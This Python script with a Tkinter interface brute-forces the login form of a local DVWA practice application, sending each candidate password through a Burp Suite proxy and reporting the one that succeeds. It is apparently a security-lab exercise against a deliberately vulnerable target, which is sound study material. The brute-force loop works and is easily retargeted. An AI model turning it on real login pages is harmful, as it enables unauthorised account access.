import requests
import tkinter as tk

# DVWA base URL (adjust as needed)
DVWA_URL = "http://localhost/DVWA/login.php"
PROXY_URL = "http://127.0.0.1:8080"  # Burp Suite proxy address

# Function to perform brute force attack
def perform_brute_force(username, password_list):
    # Configure proxy settings for Burp Suite
    proxies = {
        'http': PROXY_URL,
        'https': PROXY_URL
    }

    # Iterate through the password list
    for password in password_list:
        # Prepare the data for the login request
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }

        # Send the login request to DVWA through Burp Suite proxy
        response = requests.post(DVWA_URL, data=data, proxies=proxies)

        # Check if the login was successful
        if "Welcome to the password protected area" in response.text:
            result_label.config(text=f"Successful login! Password: {password}")
            return

    result_label.config(text="Brute force attack unsuccessful")

# TKinter GUI setup
root = tk.Tk()
root.title("Brute Force Attack with Burp Suite")

# Username entry
username_label = tk.Label(root, text="Username:")
username_label.grid(row=0, column=0, padx=10, pady=10)

username_entry = tk.Entry(root)
username_entry.grid(row=0, column=1, padx=10, pady=10)

# Password list entry
password_label = tk.Label(root, text="Password List (comma-separated):")
password_label.grid(row=1, column=0, padx=10, pady=10)

password_entry = tk.Entry(root)
password_entry.grid(row=1, column=1, padx=10, pady=10)

# Button to trigger attack
attack_button = tk.Button(root, text="Perform Brute Force Attack", command=lambda: perform_brute_force(username_entry.get(), password_entry.get().split(",")))
attack_button.grid(row=2, column=0, columnspan=2, padx=10, pady=10)

# Label to display attack result
result_label = tk.Label(root, text="")
result_label.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

# Start the TKinter event loop
root.mainloop()